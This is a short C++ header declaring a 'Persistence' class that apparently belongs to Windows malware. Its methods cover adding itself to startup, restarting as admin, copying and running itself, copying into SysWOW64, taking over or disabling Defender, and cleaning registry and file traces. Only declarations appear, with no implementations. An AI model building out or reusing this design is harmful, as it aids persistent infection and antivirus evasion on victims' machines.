
#include "include.h"

class Persistence {
    public:
        static bool isUserAdmin();
        static void DefenderOwner();
        static bool checkAndCreateFile(const std::string& filename);
        static void addToStartup();
        static void reset();
        static void restartSystem();
        static void restartAsAdmin();
        static bool copyAndRunSelf();
        static void cleanreg();
        static void cleanfile();
        static std::string getDiskSerial();
        static void CopyFileToSysWow64(std::string destPath, std::string filename);
        static void StopExe();
    };